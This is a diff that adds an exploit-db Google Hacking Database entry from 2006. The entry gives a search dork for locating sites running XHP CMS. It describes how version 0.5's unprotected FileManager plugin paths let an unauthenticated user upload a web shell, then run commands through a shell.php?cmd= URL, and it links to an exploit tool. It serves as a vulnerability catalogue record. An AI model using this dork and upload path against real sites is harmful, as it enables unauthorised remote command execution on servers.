@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/1318
+Category:         Advisories and Vulnerabilities
+Published Date:   2006-03-28
+Author:           anonymous
+GoogleDork:       "Powered by XHP CMS" -ihackstuff -exploit -xhp.targetit.ro
+Description:      "Powered by XHP CMS" -ihackstuff -exploit -xhp.targetit.ro
+
+
+tested version: 0.5 without to have admin rights, you can go to: http://[target]/path_to_xhp_cms]/inc/htmlarea/plugins/FileManager/manager.php or http://[target]/path_to_xhp_cms]/inc/htmlarea/plugins/FileManager/standalonemanager.php to upload a shell with the usual code inside... after: http://[target]/[path]/filemanager/shell.php?cmd=ls%20-la tool: http://retrogod.altervista.org/XHP_CMS_05_xpl.html
